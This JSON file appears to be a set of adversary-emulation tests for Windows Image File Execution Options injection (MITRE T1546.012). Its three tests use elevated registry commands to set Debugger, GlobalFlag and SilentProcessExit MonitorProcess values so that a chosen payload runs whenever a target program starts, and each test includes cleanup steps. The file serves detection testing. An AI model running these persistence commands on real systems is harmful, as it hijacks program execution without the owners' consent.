{
  "attack_technique": "T1546.012",
  "display_name": "Event Triggered Execution: Image File Execution Options Injection",
  "atomic_tests": [
    {
      "name": "IFEO Add Debugger",
      "description": "Leverage Global Flags Settings",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f >nul 2>&1",
        "procedure": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\""
      },
      "input_arguments": [
        {
          "arg_name": "target_binary",
          "description": "Binary To Attach To",
          "type": "path",
          "default": "calc.exe"
        },
        {
          "arg_name": "payload_binary",
          "description": "Binary To Execute",
          "type": "path",
          "default": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "auto_generated_guid": "fdda2626-5234-4c90-b163-60849a24c0b8"
    },
    {
      "name": "IFEO Global Flags",
      "description": "Leverage Global Flags Settings",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f >nul 2>&1",
        "procedure": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\""
      },
      "input_arguments": [
        {
          "arg_name": "target_binary",
          "description": "Binary To Attach To",
          "type": "path",
          "default": "notepad.exe"
        },
        {
          "arg_name": "payload_binary",
          "description": "Binary To Execute",
          "type": "path",
          "default": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "auto_generated_guid": "46b1f278-c8ee-4aa5-acce-65e77b11f3c1"
    },
    {
      "name": "GlobalFlags in Image File Execution Options",
      "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force",
        "procedure": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe"
      },
      "input_arguments": [
        {
          "arg_name": "process",
          "description": "Process to monitor",
          "type": "string",
          "default": "whoami.exe"
        },
        {
          "arg_name": "cmd_to_run",
          "description": "Command to execute",
          "type": "string",
          "default": "cmd.exe /c calc.exe"
        }
      ],
      "auto_generated_guid": "13117939-c9b2-4a43-999e-0a543df92f0d"
    }
  ]
}